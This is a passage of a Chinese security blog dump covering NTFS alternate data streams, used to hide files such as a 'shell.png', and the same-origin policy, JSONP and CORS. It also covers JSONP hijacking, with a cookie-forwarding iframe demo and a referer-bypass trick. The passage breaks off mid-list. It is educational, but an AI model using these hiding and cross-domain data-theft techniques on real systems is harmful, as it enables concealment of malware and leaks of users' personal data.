主文件表\"></a>2.1 MFT 主文件表</h3><p>ntfs 文件系统使用 Master File Table（MFT）即主文件表来管理文件。下面是百度百科对于 MFT 的简略介绍：</p>\n<blockquote>\n<p>MFT，即主文件表（Master File Table）的简称，它是NTFS文件系统的核心。MFT由一个个MFT项（也称为文件记录）组成，每个MFT项占用1024字节的空间。每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。每个文件和目录的信息都包含在MFT中，每个文件和目录至少有一个MFT项。除了引导扇区外，访问其他任何一个文件前都需要先访问MFT，在MFT中找到该文件的MFT项，根据MFT项中记录的信息找到文件内容并对其进行访问。NTFS(New Technology File System)，是一种新型文件系统。</p>\n</blockquote>\n<p>windows 的每个文件都对应一个 MFT 记录，每个记录由诸多属性组成。譬如我们现在有一个叫做 test.txt 的文件，内容为 <strong>Hello,world!</strong> , 那么它的 MFT 结构如下图：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/3.jpg\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.jpg\"></p>\n<p>我们通过这个实例来学习下 MFT 的属性。</p>\n<ul>\n<li>$FILE_NAME 属性包含文件名，创建，修改，访问的时间。这里的文件名为 test.txt</li>\n<li>$DATA 包含文件具体内容。这要注意的是 ，此例文本内容偏小，小于1kb，所以直接存储在 MFT 这个结构里面了，称作 Resident（理解为本地居民）。如果文件内容大于1kb，该位置就会放置改文本内容的具体存储地址，类型也会变为 non-resident。</li>\n</ul>\n<h3 id=\"2-2-MFT-的多文件属性\"><a href=\"#2-2-MFT-的多文件属性\" class=\"headerlink\" title=\"2.2 MFT 的多文件属性\"></a>2.2 MFT 的多文件属性</h3><p>通过上面我们了解了 MFT 的大致结构，而它并不仅仅是具有一个 $DATA 属性的。一个文件可以有多个 $DATA 属性。这里为了方便查看，我们还是来看看引用文章上面的例子。当下我们向 test.txt 加入一个 ThisIsAnADS 的 $DATA属性:</p>\n<p><code>echo Hello,freebuf! &gt; test.txt:ThisIsAnADS</code></p>\n<p>其 MFT 结构就变成了下面这样：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/4.jpg\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.jpg\"></p>\n<p>这里可以看到多出来一个 $DATA 属性，而且还有名字，就是我们起的 ThisIsAnADS 。我们平常存储在文件里的都是称为主数据流(primary data stream)，默认没有名字。而之后创建的数据流就叫做供选数据流(alternate data stream),即 ADS，原文章作者说其翻译为<strong>供选数据流</strong>更合适，我也有同感。翻译为交换数据流并没有体现出交换两个字的过程。</p>\n<p>通常意义下，ADS 对用户来说都是表层可视化隐藏的，譬如前言例子中的文件，打开是无内容的。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p>单单看大小确实如此。我们先略过占用空间不为0的这个现象。后面会讨论到。</p>\n<p>下面，我们先来看看如何看到隐藏在供选数据流里面的数据。</p>\n<h3 id=\"2-3-供选数据流的使用\"><a href=\"#2-3-供选数据流的使用\" class=\"headerlink\" title=\"2.3 供选数据流的使用\"></a>2.3 供选数据流的使用</h3><p>由于隐蔽性较强，这一技术被广泛的应用到了木马，后门文件的隐藏上面。我们不仅可以隐藏文本数据到 ads 中，还可以是图片数据，亦或是可执行的 exe 文件数据。方法相似：</p>\n<h4 id=\"1-寄生在文件上\"><a href=\"#1-寄生在文件上\" class=\"headerlink\" title=\"1# 寄生在文件上\"></a>1# 寄生在文件上</h4><p>同上例，我们可以将图片隐藏进入另一个文件的供选数据流里面,此时使用到 type 命令，作用相似于 linux 下的cat 命令，具体用法<a href=\"https://blog.csdn.net/grey_csdn/article/details/69922844\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">type shell.png &gt;&gt; 1.txt:test.png<br></code></pre></td></tr></table></figure>\n\n<p>我们将图片数据寄生在文件 1.txt 上面</p>\n<h4 id=\"2-寄生在文件夹上\"><a href=\"#2-寄生在文件夹上\" class=\"headerlink\" title=\"2# 寄生在文件夹上\"></a>2# 寄生在文件夹上</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">type shell.png &gt;&gt; test:test.png<br></code></pre></td></tr></table></figure>\n\n<p>将图片数据寄生在文件夹 test 上。</p>\n<h3 id=\"2-4-查看供选数据流\"><a href=\"#2-4-查看供选数据流\" class=\"headerlink\" title=\"2.4 查看供选数据流\"></a>2.4 查看供选数据流</h3><p>现在我们讲讲如何查看 ads 数据。</p>\n<h4 id=\"1-系统自带应用查看\"><a href=\"#1-系统自带应用查看\" class=\"headerlink\" title=\"1# 系统自带应用查看\"></a>1# 系统自带应用查看</h4><ul>\n<li><p>文本文件的话就用记事本 【notepad + 文件名】打开。</p>\n</li>\n<li><p>图片文件就是用画板 【mspaint + 文件名】打开。</p>\n</li>\n<li><p>可执行文件就用 【start + 文件名】 打开。</p>\n</li>\n</ul>\n<p>这里需要注意的是，可能考虑到安全因素，微软在 windows_Xp 之后就禁止直接执行供选数据流中的可执行文件了，但是是存在绕过方法的，有兴趣的同学可以<a href=\"https://www.freebuf.com/articles/73270.html\" target=\"_blank\" rel=\"noopener\">戳这</a>进去看看。</p>\n<p>我们这里沿用上面的例子，打开寄生在文件夹下面的图片</p>\n<p><code>mspaint test:test.png</code></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<h4 id=\"2-cmd-下使用-dir-r-命令查看\"><a href=\"#2-cmd-下使用-dir-r-命令查看\" class=\"headerlink\" title=\"2# cmd 下使用 dir /r 命令查看\"></a>2# cmd 下使用 dir /r 命令查看</h4><p>还是以上面图片为例，在文件存在的路径下面打开 cmd：</p>\n<p><code>dir /r test:test.png</code></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.png\"></p>\n<p>由于之前我测试的时候还添加了几次，所以查看 ads 数据流的时候还有其他文件。这也从侧面反映了一个问题，就是可以在一个文件或者文件下添加多个供选数据流，而且它们互不影响。</p>\n<h4 id=\"3-powershell-下的-Get-Content-指令查看\"><a href=\"#3-powershell-下的-Get-Content-指令查看\" class=\"headerlink\" title=\"3# powershell 下的 Get-Content 指令查看\"></a>3# powershell 下的 Get-Content 指令查看</h4><p>指令格式</p>\n<p><code>Get-Content [被寄生的文件/文件夹] -stream [ads数据流名]</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\">PS C:\\Users\\rt95\\Desktop\\test&gt; <span class=\"hljs-built_in\">Get-content</span> test <span class=\"hljs-literal\">-stream</span> test.png<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<p>可以看到，这条指令是直接可以读出数据内容的，用来读取寄生的 ads 文本数据会非常方便。</p>\n<h2 id=\"3-几个问题\"><a href=\"#3-几个问题\" class=\"headerlink\" title=\"3@ 几个问题\"></a>3@ 几个问题</h2><h3 id=\"3-1-供选数据流的大小\"><a href=\"#3-1-供选数据流的大小\" class=\"headerlink\" title=\"3.1 供选数据流的大小\"></a>3.1 供选数据流的大小</h3><p>刚刚我们看到，存储的文件大小和占用空间不一致。证明供选数据流是会占用磁盘空间的。侧面反映出 windows 系统查看文件属性的时候，显示文件大小只是主数据流的大小，而占用空间则会较为真实的反映主数据和供选数据流的总大小。</p>\n<h3 id=\"3-2-linux-下对-ads-的读取\"><a href=\"#3-2-linux-下对-ads-的读取\" class=\"headerlink\" title=\"3.2  linux 下对 ads 的读取\"></a>3.2  linux 下对 ads 的读取</h3><p>有时会出现在 linux 系统下读取 windows 文件的情况，这时我们需要挂载磁盘的读取方式，或者使用 ntfs-3g 程序进行 ntfs 文件系统的文件读写。</p>\n<blockquote>\n<p>NTFS-3G 是一个由 <a href=\"http://zh.wikipedia.org/wiki/Tuxera\" target=\"_blank\" rel=\"noopener\">Tuxera</a> 公司开发并维护的开源项目。目的是为 Linux 提供 NTFS 分区的的驱动程序。可以安全高速的对 Windows NT （包含 Windows 2000、Windows XP、Windows Server 2003 和 Windows Vista）的文件系统进行读写。</p>\n</blockquote>\n<p>可以使用 apt 或者 yum 下载 ntfs-3g。</p>\n<p>然后我们创建一个 含有 ads 的文本文件。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">touch 1.txt<br>echo hello,rt95 &gt; 1.txt:2.txt<br>cat 1.txt:2.txt<br></code></pre></td></tr></table></figure>\n\n<p>可以看到文件内容被显示。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<h2 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4@ 总结\"></a>4@ 总结</h2><p>实习结束了，学到了不少东西，有感知上的，有知识上的。希望剩下的大学时光能不辜负自己的一腔热血吧~</p>\n<p>加油 :)</p>\n<p>Reference:</p>\n<p><code>https://baike.baidu.com/item/MFT/1185355?fr=aladdin</code></p>\n<p><code>https://www.freebuf.com/articles/73270.html</code></p>\n<p><code>http://www.huike007.cn/?p=150</code></p>\n<p><code>https://blog.csdn.net/alone_map/article/details/51851071</code></p>\n<p><code>https://www.qingsword.com/qing/812.html</code></p>\n"},{"title":"规避浏览器同源策略 & JSONP的原理和利用","date":"2019-09-01T16:00:00.000Z","_content":"\n## 1@ 前言\n\n前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。\n\n\n\n## 2@ 同源策略\n\n想必搞安全的初期大都会读过道哥的那本**`白帽子`**,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。\n\n\n\n> 1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。\n\n\n\n> \n>\n> 同源策略 （Same Origin Policy）是一种约定。\n>\n> 浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。\n>\n> ​                                                         \t\t\t\t\t\t\t\t\t---------- 《白帽子讲web安全》\n\n\n\n### 2.1 介绍\n\n那么，什么时候两个资源才算是同源呢？\n\n影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。\n\n- host(域名或者IP地址)\n- 子域名\n- 端口\n- 协议\n\n举个简单的例子：\n\n`http://test1.rt95.com/test.html`\n\n`http://test2.rt95.com/test.html`\n\n上面两个资源就是不同源的，因为他们的子域名不同 。\n\n\n\n### 2.2 限制范围\n\n当前，如果非同源，下面的行为会受到限制。\n\n```\n（1） Cookie、LocalStorage 和 IndexDB 无法读取。\n\n（2） DOM 无法获得。\n\n（3） AJAX 请求不能发送。\n```\n\n\n\n### 2.3 规避同源策略的方法\n\n#### 1、Cookie\n\n**如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie**\n\n\n\n- 上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。\n\n\n\n假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。\n\n测试网站为阮大佬的博客和书籍页面。\n\n打开 `es6.ruanyifeng.com`,控制台改变域名：\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png)\n\n\n\n然后设置一个 cookie 值：\n\n\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png)\n\n\n\n继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：\n\n![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png)\n\n\n\n这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。\n\n一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。\n\n\n\n\n\n下面再给出一个比较有意思的跨域获取 cookie 的思路：\n\n- 现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:\n\n```html\n<html>\n<head>\n</head>\n<body>\n    <iframe src='http://cms2.test.ink/2.html' width='100' height='100'> </iframe>\n    <textarea id=\"zhaochao\">\n    </textarea>\n</body>\n</html>\n```\n\n- 而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：\n\n```html\n<html>\n<head>\n</head>\n<body>\n<script>\nwindow.location=\"http://cms1.test.ink/3.html?\"+document.cookie;\n</script>\n</body>\n</html>\n```\n\n- cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：\n\n```html\n<html>\n<head>\n</head>\n<body>\n<script>\nwindow.parent.document.getElementById(\"zhaochao\").value=window.location.toString().substring(window.location.toString().indexOf(\"?\"));\n</script>\n</body>\n```\n\n- 访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。\n\n ![22.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png)\n\n\n\n#### 2、iframe\n\n如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。\n\n像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）\n\n\n\n ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png)\n\n\n\n如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 `document.domain` 一致即可访问。\n\n下面介绍下完全不同源的网站进行跨域访问的三种方法。\n\n```\n片段识别符（fragment identifier）\nwindow.name\n跨文档通信API（Cross-document messaging）\n```\n\n\n\n#### 3、片段识别符\n\n片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 `#` 之后的内容。如果知识改变片段识别符，页面不会重新刷新。\n\n这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。\n\n\n\n```javascript\n// 父窗口写入数据\nvar src = originRL + '#' + data;\n$('iframe').get(0).src = src；\n```\n\n\n\n```javascript\n// 子窗口查看数据\nwindow.location.href； // # 之后有 data 的值\n```\n\n\n\n ![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png)\n\n\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png)\n\n\n\n#### 4、window.name\n\nwindow.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）\n\n我们依旧拿上面的例子来演示：\n\n```\n在父窗口中打开子窗口，键入 window.name 的值 ----->\n然后改变 window.location 的值进入到父窗口  ----->\n父窗口中获得子窗口的标签，然后读取其 window.name 的值\n```\n\n\n\n ![7.pg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png)\n\n\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png)\n\n\n\n\n\n#### 5、window.postMessage\n\n上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。\n\n\n\n> 举例来说，父窗口`http://aaa.com`向子窗口`http://bbb.com`发消息，调用`postMessage`方法就可以了\n\n\n\n我们来看看 w3c 中定义 的 postMessage() 方法的定义\n\n> targetWindow .postMessage（message，targetOrigin，[ transfer ]）\n>\n> - *targetWindow*\n>\n>   对将接收消息的窗口的引用。获得此类引用的方法包括：`Window.open` （生成一个新窗口然后引用它），`Window.opener` （引用产生这个的窗口），`HTMLIFrameElement.contentWindow`（`<iframe>`从其父窗口引用嵌入式），`Window.parent`（从嵌入式内部引用父窗口`<iframe>`）`Window.frames` +索引值（命名或数字）。\n>\n> - *message*\n>\n>   要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。\n>\n> - *targetOrigin*\n>\n>   指定要调度的事件的`targetWindow`的原点，可以是文字字符串`\"*\"`（表示没有首选项），也可以是URI。如果在计划调度事件时，`targetWindow`文档的方案，主机名或端口与`targetOrigin`提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果`postMessage()`用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。**始终提供具体的targetOrigin，而不是\\*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。**\n>\n> - *stransfer*（可选的）\n>\n>   是与消息一起传输的`Transferable`对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。\n>\n>  \n\n\n\n\n\n```javascript\nvar popup = window.open('http://bbb.com', 'title');\npopup.postMessage('Hello World!', 'http://bbb.com');\n```\n\npostMessage 的参数是：\n\n- 1、发送的内容\n- 2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。\n\n\n\n父子窗口均可以通过监听 message 事件来获取消息：\n\n```javascript\nwindow.addEventListener('message', function(e) {\n  console.log(e.data);\n},false);\n```\n\n\n\nmessage 事件相关的对象有下面属性：\n\n- `event.source`：对发送消息的`window`对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。\n- `event.origin`: 调用当时发送消息的窗口的原点`postMessage`，即信息来源的一方。\n- `event.data`: 消息内容\n\n\n\n接下来我们创建一个父子窗口交互的代码示例：\n\n\n\n```javascript\n// 父窗口 http://127.0.0.1/frametest/test.html\n <iframe src=\"http://127.0.0.1:8086/child.html\" frameborder=\"0\"></iframe>\n <script>\n     window.addEventListener('message', receiveMessage);\n\n     function receiveMessage(event) {\n         document.write('this is receiver\\'s receiving data' + event.data);\n\n      }\n </script>\n```\n\n\n\n```html\n// 子窗口 http://127.0.0.1:8086/child.html\n<script>\n      window.addEventListener('message', receiveMessage);\n\n      function receiveMessage(event) {\n          event.source.postMessage('message_received', event.origin);\n          alert(event.data);\n\n        }\n</script>\n```\n\n\n\n然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)\n\n\n\n![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png)\n\n\n\n ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png)\n\n\n\n ![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png)\n\n\n\n\n\n### 2.4 补充\n\n尽管有同源策略，但是在浏览器中，`<script>` `img` `iframe` `<link>` 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 **src** 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。\n\n除了上面规避同源策略的方法外，还有几种：\n\n- flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。\n- 可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。\n- 第三种方式即是我们下面要探讨的 JSONP。\n\n\n\n## 3@ JSONP 介绍\n\n​\t JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。\n\n\n\n### 3.1 基础知识\n\n JSONP 的基本思想就是，网页添加一个 `<script>` 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 `callback` 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型[在这](https://mathiasbynens.be/demo/javascript-mime-type),实际上也就是我们上面补充点中说的，`<script>` 等标签可以跨域加载资源。\n\n\n\n我们来看一个例子：\n\n```javascript\n// 构造一个加载跨域数据的脚本，来读取当前价格指数\n function refreshPrice(data) { //构造回调函数\n            var p = $('p#content').get(0);\n            p.innerHTML = '当前价格' +\n                data['0000001'].name + ': ' +\n                data['0000001'].price + '；' +\n                data['1399001'].name + ': ' +\n                data['1399001'].price;\n        }\n  var js = document.createElement('script');\n  head = $('head');\n  js.src = \"http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice\";\n  head.append(js);  // 添加标签，加载数据，触发回调函数\n```\n\n\n\n ![12.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png)\n\n\n\n从这个例子我们也可以看出来，JSONP 由两部分组成：\n\n- 回调函数\n- 请求传入的数据\n\n\n\n再举一个我们生活中大概率会碰到的例子：百度。\n\n百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。\n\n`https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&&cb=a`\n\n\n\n结果为：\n\n```json\na(\n{\n\"q\": \"西电\",\n\"p\": false,\n\"s\": [\n\"西电教务处\",\n\"西电睿思\",\n\"西电迎新网\",\n\"西电图书馆\",\n\"西电研究生\",\n\"西电研究生系统\",\n\"西电研究生院\",\n\"西电信息化建设处\",\n\"西电电院\",\n\"西电就业信息网\"\n]\n}\n)\n```\n\n\n\ns 其实就是搜索结果的匹配项，而 cb 这个参数就是请求资源后的回调函数。\n\n\n\n\n\n### 3.2 JSONP 实现 ajax 的跨域请求\n\n我们知道，原生 Js 的 ajax 异步请求是有同源策略所限制的，但是有了 JSONP，我们便可以实现跨域请求。\n\n接下来我们构造另一个域的生成 json 内容的 php 文件进行异步加载。\n\n```php\n//127.0.0.1:8086/test.php\n<?php\n$data = array(\n    'age'=>20,\n    'name'=>'rt95'\n);\n$callback = $_GET['callback'];\n\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n\n\n\n\n```html\n//127.0.0.1/frametest/test.html\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function handler(data) {\n            var p = $('p#content');\n            p.html('name : ' + data.name + '<br>' + 'age : ' + data.age);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: 'http://127.0.0.1:8086/test.php',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: 'handler' // 回调函数名 \n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n\n\n运行文件！走你～你是不是发现了报错？长下面这样：\n\n ![13.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/13.png)\n\n\n\n我们可以看到是被 CORS 这个规则给阻止了，那，什么是 CORS 呢？\n\n\n\n### 3.3 CORS (跨域资源共享)\n\n\n\n> 如果浏览器支持HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。\n>\n> CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。\n\n\n\n首先，我们需要了解：\n\nOrigin 表示的是本域，就是浏览器当前页面的域。我们看图说话：\n\n\n\n ![14.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/14.png)\n\n\n\n假如我们的本域是 my.com ，待请求的外域为 sina.com，那么只要服务器端的响应头的 **Access-Control-Allow-Origin** 字段有我们的本域，亦或是通配符 * ，本次请求就可以成功。\n\n像 POST ，GET 这样的简单请求只需验证这个字段即可，但是像 PUT，DELETE 等请求，在发送 ajax 之前，浏览器还会先发出一个 OPTION 请求，类似下面这样：\n\n```http\nOPTIONS /path/to/resource HTTP/1.1\nHost: bar.com\nOrigin: http://my.com\nAccess-Control-Request-Method: POST\n```\n\n服务器端会给出允许响应的请求类型：\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://my.com\nAccess-Control-Allow-Methods: POST, GET, PUT, OPTIONS\nAccess-Control-Max-Age: 86400\n```\n\n如果我们刚开始的请求是在字段 **Access-Control-Allow-Methods** 里面，那么浏览器就会继续发送 ajax 请求，否则会抛出错误，终止操作。\n\n\n\n有了这些知识，我们就可以很轻松的解决上面的问题了。修改一下服务端的脚本，添加返回头的 **Access-Control-Allow-Origin** 字段。\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin:*\");\n$data = array(\n    \"age\"=>20,\n    \"name\"=>'rt95'\n);\n$callback = $_GET['callback'];\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n\n\n ![15.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/15.png)\n\n\n\n\n\n这里有两个点需要注意下：\n\n- dataType 的 T 是大写，一定要注意！！\n- 请求界面一定要给返回页面中调用 callback 指定的函数，具体实现根据不同需要而定。\n\n\n\n\n\n\n\n## 4@ JSONP 的劫持\n\n### 4.1 漏洞原理\n\n介绍了这么多知识，接下来我们就来介绍如何具体利用这个可能的漏洞点。\n\n ![16.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/16.png)\n\n\n\n\n\n其实上面这张图已经十分清晰的展示了 JSONP 的利用过程。\n\n```\n用户注册网站 B ----->\n用户访问网站 A ----->\nA 网站的恶意脚本功能是通过注册 Callback 函数来像 B 网站发起请求,获得用户在 B 上的信息 ----->\nB 网站未做请求检测，返回用户数据 ----->\n数据上传至攻击者服务器\n```\n\n\n\n### 4.2 漏洞危害\n\n> **JSONP是一种敏感信息泄露的漏洞**，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，**网站中包含其他网站的JSONP漏洞利用代码**，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。\n\n\n\n\n\n### 4.3 漏洞利用\n\n\n\n要想利用 JSONP 漏洞，必须找到存在漏洞的接口，这个接口必须满足以下三个条件：\n\n- 泄露出了敏感的信息，如 email,username,严重甚至 token。\n- 未检测 referer（可以绕过 HTML5 的 CORS 策略），或者验证方式不太严谨，正则写的不完善等等，譬如设置验证的 referer 为 `http://www.xxx.com `, 但是`http://www.xxx.com.evil.com ` 依旧可以绕过限制。\n- 未启用 token 验证。\n\n\n\n#### 寻找方法\n\n我们可以使用如下方法来初步粗略的寻找可能存在漏洞的接口。\n\n1、打开浏览器控制台的 Preseve log ,防止之前找到的结果被刷新的页面覆盖。\n\n ![17.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/17.png)\n\n\n\n\n\n2、手动通过关键词筛选一些信息，搜索一些关键词，譬如 `callback`,`jsonp` 